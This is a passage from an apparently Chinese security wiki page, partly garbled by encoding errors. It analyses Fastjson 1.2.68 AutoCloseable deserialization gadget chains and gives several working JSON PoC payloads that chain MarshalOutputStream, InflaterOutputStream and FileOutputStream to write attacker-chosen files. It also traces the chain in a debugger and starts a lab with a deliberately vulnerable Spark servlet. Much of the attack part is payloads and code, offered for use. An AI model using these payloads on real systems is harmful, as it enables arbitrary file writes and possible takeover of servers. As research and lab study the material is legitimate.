class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428135602-lxmq0oy.43fd33de.png" alt="image" loading="lazy">â€‹</p><p><a href="http://scz.617.cn:8/web/202008111505.txt" target="_blank" rel="noopener noreferrer">http://scz.617.cn:8/web/202008111505.txt<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p><div class="language-bash line-numbers-mode" data-ext="sh" data-title="sh"><pre class="language-bash"><code>$ xxd <span class="token parameter variable">-g</span> <span class="token number">1</span> src
0000000: <span class="token number">73</span> <span class="token number">63</span> 7a <span class="token number">20</span> <span class="token number">69</span> <span class="token number">73</span> <span class="token number">20</span> <span class="token number">68</span> <span class="token number">65</span> <span class="token number">72</span> <span class="token number">65</span>                 scz is here
å‹ç¼©:
$ <span class="token function">java</span> DeflateTest src dst <span class="token number">0</span>
$ <span class="token builtin class-name">echo</span> <span class="token parameter variable">-ne</span> <span class="token string">&#39;scz is here&#39;</span> <span class="token operator">|</span> python2 <span class="token parameter variable">-c</span> <span class="token string">&#39;import sys,zlib;sys.stdout.write(zlib.compress(sys.stdin.read(),9))&#39;</span> <span class="token operator">&gt;</span> dst
$ <span class="token function">cat</span> src <span class="token operator">|</span> python2 <span class="token parameter variable">-c</span> <span class="token string">&#39;import sys,zlib;sys.stdout.write(zlib.compress(sys.stdin.read(),9))&#39;</span> <span class="token operator">&gt;</span> dst
$ xxd <span class="token parameter variable">-g</span> <span class="token number">1</span> dst
0000000: <span class="token number">78</span> da 2b 4e ae <span class="token number">52</span> c8 2c <span class="token number">56</span> c8 <span class="token number">48</span> 2d 4a 05 00 <span class="token number">18</span>  x.+N.R.,V.H-J<span class="token punctuation">..</span>.
0000010: 6d 04 <span class="token number">11</span>                                         m<span class="token punctuation">..</span>

è§£å‹:
$ <span class="token function">java</span> DeflateTest dst src <span class="token number">1</span>
$ <span class="token function">cat</span> dst <span class="token operator">|</span> python2 <span class="token parameter variable">-c</span> <span class="token string">&#39;import sys,zlib;sys.stdout.write(zlib.decompress(sys.stdin.read()))&#39;</span> <span class="token operator">&gt;</span> src
$ openssl zlib <span class="token parameter variable">-d</span> <span class="token operator">&lt;</span> dst <span class="token operator">&gt;</span> src
$ <span class="token builtin class-name">printf</span> <span class="token string">&quot;<span class="token entity" title="\x1f">\x1f</span><span class="token entity" title="\x8b">\x8b</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span><span class="token entity" title="\x00">\x00</span>&quot;</span> <span class="token operator">|</span> <span class="token function">cat</span> - dst <span class="token operator">|</span> <span class="token function">gzip</span> <span class="token parameter variable">-dc</span> <span class="token operator">&gt;</span> src
gzip: stdin: unexpected end of <span class="token function">file</span>
æœ‰ä¸ªè­¦å‘Šï¼Œä½†è§£å‹æ— è¯¯ã€‚
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h4 id="è°ƒè¯•åˆ†æ" tabindex="-1"><a class="header-anchor" href="#è°ƒè¯•åˆ†æ"><span>è°ƒè¯•åˆ†æ</span></a></h4><p><strong>ã€PoCã€‘</strong></p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code><span class="token punctuation">{</span>
    &#39;@type&#39;<span class="token operator">:</span><span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
    &#39;@type&#39;<span class="token operator">:</span>&#39;sun.rmi.server.MarshalOutputStream&#39;<span class="token punctuation">,</span>
    &#39;out&#39;<span class="token operator">:</span>
    <span class="token punctuation">{</span>
        &#39;@type&#39;<span class="token operator">:</span>&#39;java.util.zip.InflaterOutputStream&#39;<span class="token punctuation">,</span>
        &#39;out&#39;<span class="token operator">:</span>
        <span class="token punctuation">{</span>
           &#39;@type&#39;<span class="token operator">:</span>&#39;java.io.FileOutputStream&#39;<span class="token punctuation">,</span>
           &#39;file&#39;<span class="token operator">:</span>&#39;d<span class="token operator">:</span>/tmp/fj_hack_jdk11&#39;<span class="token punctuation">,</span>
           &#39;append&#39;<span class="token operator">:</span><span class="token boolean">false</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        &#39;infl&#39;<span class="token operator">:</span>
        <span class="token punctuation">{</span>
            &#39;input&#39;<span class="token operator">:</span>
            <span class="token punctuation">{</span>
                &#39;array&#39;<span class="token operator">:</span>&#39;eNorSS0uUUiqVMjNT9LjAgAhzgRS&#39;<span class="token punctuation">,</span>
                &#39;limit&#39;<span class="token operator">:</span><span class="token number">21</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        &#39;bufLen&#39;<span class="token operator">:</span><span class="token number">100</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    &#39;protocolVersion&#39;<span class="token operator">:</span><span class="token number">1</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>è‹¥ <code>bufLen = 1048576</code>â€‹ï¼Œè¿™æ„å‘³ç€ç¼“å†²åŒºå¤§å°ä¸º 1MBï¼Œæ ¹æ®å®é™…æƒ…å†µè®¾å®šã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œç¼“å†²åŒºå¤§å°è¶Šå¤§ï¼Œå†…å­˜æ¶ˆè€—è¶Šé«˜ï¼Œä½†æ˜¯è§£å‹é€Ÿåº¦å¯èƒ½ä¼šæ›´å¿«ã€‚</p><hr><p><strong>è°ƒè¯•</strong></p><ol><li>ä½¿ç”¨ <code>sun.rmi.server.MarshalOutputStream#MarshalOutputStream(java.io.OutputStream, int)</code>â€‹ è¿™ä¸ªæ„é€ æ–¹æ³•, è¿›è€Œè°ƒç”¨åˆ°å®ƒçˆ¶ç±»çš„æ–¹æ³• <code>java.io.ObjectOutputStream#ObjectOutputStream()</code>â€‹</li></ol><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428140759-vo35bbf.ad867b6b.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428142145-h2f7z8p.96fa4792.png" alt="image" loading="lazy">â€‹</p><p>å¯¹åº” poc</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code>&#39;@type&#39;<span class="token operator">:</span>&#39;sun.rmi.server.MarshalOutputStream&#39;<span class="token punctuation">,</span>
&#39;out&#39;<span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
&#39;protocolVersion&#39;<span class="token operator">:</span><span class="token number">1</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="2"><li>æ¥ç€è§£æåµŒå¥—çš„ <code>@type</code>â€‹ï¼Œè°ƒç”¨åˆ° <code>java.util.zip.InflaterOutputStream#InflaterOutputStream(java.io.OutputStream, java.util.zip.Inflater, int)</code>â€‹ è¿™ä¸ªæ„é€ æ–¹æ³•ï¼Œä¹Ÿä¼šè°ƒç”¨å®ƒçˆ¶ç±»çš„æ–¹æ³•ã€‚</li></ol><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428142609-oe8f9kc.2d6d022c.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428150101-avrn0o4.da0f056d.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428152943-3nr5s9t.e1b6c234.png" alt="image" loading="lazy">â€‹</p><p>å¯¹åº” poc</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code>&#39;@type&#39;<span class="token operator">:</span>&#39;java.util.zip.InflaterOutputStream&#39;<span class="token punctuation">,</span>
&#39;out&#39;<span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
&#39;infl&#39;<span class="token operator">:</span><span class="token punctuation">{</span>
    &#39;input&#39;<span class="token operator">:</span><span class="token punctuation">{</span><span class="token punctuation">}</span>
<span class="token punctuation">}</span><span class="token punctuation">,</span>
&#39;bufLen&#39;<span class="token operator">:</span><span class="token number">100</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="3"><li>ç»§ç»­è§£æ <code>java.io.FileOutputStream#FileOutputStream(java.io.File, boolean)</code>â€‹</li></ol><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428145135-f4izk1x.f40540b7.png" alt="image" loading="lazy">â€‹</p><p>å¯¹åº” poc</p><div class="language-json line-numbers-mode" data-ext="json" data-title="json"><pre class="language-json"><code>&#39;@type&#39;<span class="token operator">:</span>&#39;java.io.FileOutputStream&#39;<span class="token punctuation">,</span>
&#39;file&#39;<span class="token operator">:</span>&#39;d<span class="token operator">:</span>/tmp/fj_hack_jdk11&#39;<span class="token punctuation">,</span>
&#39;append&#39;<span class="token operator">:</span><span class="token boolean">false</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ol start="4"><li><p>åœ¨é‡åˆ° <code>Inflater#setInput(ByteBuffer input)</code>â€‹ æ–¹æ³•æ—¶ï¼Œfastjson å¤„ç† <code>java.nio.ByteBuffer</code>â€‹ ç±»å‹çš„ååºåˆ—åŒ–ä¼šä½¿ç”¨ <code>com.alibaba.fastjson.serializer.ByteBufferCodec</code>â€‹ è¿™ä¸ªååºåˆ—åŒ–å™¨è¿›è¡Œå¤„ç†ã€‚</p><p>è¯¥ååºåˆ—åŒ–å™¨ä¼šå°†æ•°æ®å…ˆååºåˆ—åŒ–ä¸º <code>com.alibaba.fastjson.serializer.ByteBufferCodec$ByteBufferBean</code>â€‹ï¼Œç„¶åå†è°ƒç”¨ <code>ByteBufferCodec$ByteBufferBean#byteBuffer()</code>â€‹ æ–¹æ³•è¿”å› <code>ByteBuffer</code>â€‹ å¯¹è±¡ã€‚</p></li></ol><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428153153-sputxy2.ef2e2f6d.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428153239-k8eiltl.ba990201.png" alt="image" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428153343-xip08v2.5881d220.png" alt="image" title="/fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/util/JavaBeanInfo.java:564" loading="lazy">â€‹</p><p>â€‹<img src="/SecWikiPublic/secwiki/assets/img/image-20240428132555-p2ybthd.451a137c.png" alt="image" loading="lazy">â€‹</p><h3 id="gadget-4-åŸç”Ÿå†™æ–‡ä»¶-jdk8-10" tabindex="-1"><a class="header-anchor" href="#gadget-4-åŸç”Ÿå†™æ–‡ä»¶-jdk8-10"><span>Gadget 4ï¼šåŸç”Ÿå†™æ–‡ä»¶ï¼ˆJDK8/10ï¼‰</span></a></h3><ul><li><a href="https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&amp;mid=2247484413&amp;idx=1&amp;sn=1e6e6dc310896678a64807ee003c4965&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">å¯»æ‰¾ Fastjson 1.2.68 AutoCloseable åˆ©ç”¨é“¾(3) (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li><li><a href="https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&amp;mid=2247484408&amp;idx=1&amp;sn=fc7230f61a248945721def0f63bab431&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">å¯»æ‰¾ Fastjson 1.2.68 AutoCloseable åˆ©ç”¨é“¾(2) (qq.com)<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code>ä»¥ <span class="token number">8</span>u232 ä¸ºä¾‹ï¼Œ<span class="token string">&quot;java.util.zip.Inflater&quot;</span> æ²¡æœ‰åä¸º input çš„æˆå‘˜ï¼Œåªæœ‰æˆå‘˜

<span class="token string">&quot;byte[] buf&quot;</span>ï¼Œå…¶å¯¹åº”çš„ setter æ˜¯<span class="token operator">:</span>

<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>zip<span class="token punctuation">.</span></span>Inflater</span><span class="token punctuation">.</span><span class="token function">setInput</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token keyword">void</span>

æ®æ­¤ä¿®æ”¹ <span class="token class-name">PoC</span>ã€‚
<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token punctuation">{</span>
    <span class="token char">&#39;@type&#39;</span><span class="token operator">:</span> <span class="token string">&quot;java.lang.AutoCloseable&quot;</span><span class="token punctuation">,</span>
    <span class="token char">&#39;@type&#39;</span><span class="token operator">:</span> &#39;<span class="token class-name"><span class="token namespace">sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span></span>MarshalOutputStream</span>&#39;<span class="token punctuation">,</span>
    <span class="token char">&#39;out&#39;</span><span class="token operator">:</span>
    <span class="token punctuation">{</span>
        <span class="token char">&#39;@type&#39;</span><span class="token operator">:</span> &#39;<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>zip<span class="token punctuation">.</span></span>InflaterOutputStream</span>&#39;<span class="token punctuation">,</span>
        <span class="token char">&#39;out&#39;</span><span class="token operator">:</span>
        <span class="token punctuation">{</span>
            <span class="token char">&#39;@type&#39;</span><span class="token operator">:</span> &#39;<span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span>FileOutputStream</span>&#39;<span class="token punctuation">,</span>
            <span class="token char">&#39;file&#39;</span><span class="token operator">:</span> <span class="token char">&#39;dst&#39;</span><span class="token punctuation">,</span>
            <span class="token char">&#39;append&#39;</span><span class="token operator">:</span> <span class="token boolean">false</span>
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token char">&#39;infl&#39;</span><span class="token operator">:</span>
        <span class="token punctuation">{</span>
            <span class="token char">&#39;input&#39;</span><span class="token operator">:</span> &#39;eJwL8nUyNDJSyCxWyEgtSgUAHKUENw<span class="token operator">==</span>&#39;
        <span class="token punctuation">}</span><span class="token punctuation">,</span>
        <span class="token char">&#39;bufLen&#39;</span><span class="token operator">:</span> <span class="token number">1048576</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    &#39;protocolVersion&#39;<span class="token operator">:</span> <span class="token number">1</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><blockquote><p>MarshalOutputStreamã€InflaterOutputStreamã€FileOutputStream ç”¨çš„éƒ½æ˜¯æœ‰å‚æ„</p><p>é€ å‡½æ•°ï¼Œå…¨éƒ¨é¢ä¸´ <code>ASMUtils.lookupParameterNames()</code>â€‹ çš„æ£€æŸ¥ã€‚</p><p>ç›®æ ‡ç¯å¢ƒä¸­çš„ jar åŒ…æˆ– modules æ–‡ä»¶æ˜¯å¦ä¿ç•™**<mark>è°ƒè¯•ä¿¡æ¯</mark>**ï¼Œåªèƒ½ case by case æ£€æŸ¥äº†ã€‚<a href="https://mp.weixin.qq.com/s?__biz=MzUzMjQyMDE3Ng==&amp;mid=2247484413&amp;idx=1&amp;sn=1e6e6dc310896678a64807ee003c4965&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreferrer">æˆ‘çš„<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a> RedHat 7.6 ä¸­çš„ 8u232ã€Debian 9 ä¸­çš„ 10.0.2ã€Windows ä¸­çš„ 11.0.5 éƒ½å¸¦è°ƒè¯•ä¿¡æ¯ï¼Œä½† Windows ä¸­çš„ 8u221 å°±ä¸å¸¦ï¼›æˆ–è®¸ Linux ä¸­çš„å¤§éƒ¨åˆ†éƒ½å¸¦ï¼Œè€Œ Windows ä¸­ 11 ä»¥å‰çš„éƒ½ä¸å¸¦ï¼Ÿè¿™ç§çŒœæµ‹æ²¡å•¥æ„ä¹‰ï¼Œä¹Ÿå°±é¡ºå˜´ä¸€èƒ¡çŒœã€‚</p></blockquote><p>è€Œæˆ‘çš„éƒ½æ²¡æœ‰ï¼Œå°´å°¬ã€‚ã€‚ã€‚</p><h3 id="gadget-5-å†™æ–‡ä»¶" tabindex="-1"><a class="header-anchor" href="#gadget-5-å†™æ–‡ä»¶"><span>Gadget 5ï¼šå†™æ–‡ä»¶</span></a></h3><ul><li><a href="http://scz.617.cn:8/web/202008081723.txt" target="_blank" rel="noopener noreferrer">å¯»æ‰¾ Fastjson 1.2.68 AutoCloseable åˆ©ç”¨é“¾<span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></li></ul><h2 id="fatjar-å†™æ–‡ä»¶å®æˆ˜" tabindex="-1"><a class="header-anchor" href="#fatjar-å†™æ–‡ä»¶å®æˆ˜"><span>Fatjar å†™æ–‡ä»¶å®æˆ˜</span></a></h2><ul><li>éœ€è¦æ‰¾åˆ°æ‡’åŠ è½½çš„ jar åŒ…è¿›è¡Œå®šåˆ¶æ›¿æ¢</li><li>åŸç”Ÿå†™å…¥é“¾çš„è¯éœ€è¦ JDK ç‰ˆæœ¬å¸¦æœ‰è°ƒè¯•ä¿¡æ¯ <code>LocalVariableTable</code>â€‹</li></ul><h3 id="ç¯å¢ƒæ­å»º" tabindex="-1"><a class="header-anchor" href="#ç¯å¢ƒæ­å»º"><span>ç¯å¢ƒæ­å»º</span></a></h3><p><strong>ã€æ·»åŠ ä¾èµ–ã€‘</strong></p><div class="language-xml line-numbers-mode" data-ext="xml" data-title="xml"><pre class="language-xml"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.alibaba<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>fastjson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.2.68<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.sparkjava<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>spark-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.5.5<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>org.slf4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>slf4j-simple<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.7.21<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><strong>ã€Servletã€‘</strong></p><div class="language-java line-numbers-mode" data-ext="java" data-title="java"><pre class="language-java"><code><span class="token keyword">package</span> <span class="token namespace">webdemo</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSON</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">spark<span class="token punctuation">.</span></span><span class="token class-name">Spark</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">spark<span class="token punctuation">.</span>servlet<span class="token punctuation">.</span></span><span class="token class-name">SparkApplication</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Index</span> <span class="token keyword">implements</span> <span class="token class-name">SparkApplication</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">Index</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">Spark</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token string">&quot;Hello World&quot;</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Spark</span><span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>request<span class="token punctuation">,</span> response<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> <span class="token punctuation">{</span>
            <span class="token class-name">String</span> data <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">body</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">JSONObject</span> obj <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Feature</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">JSONObject</span> ret <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">JSONObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
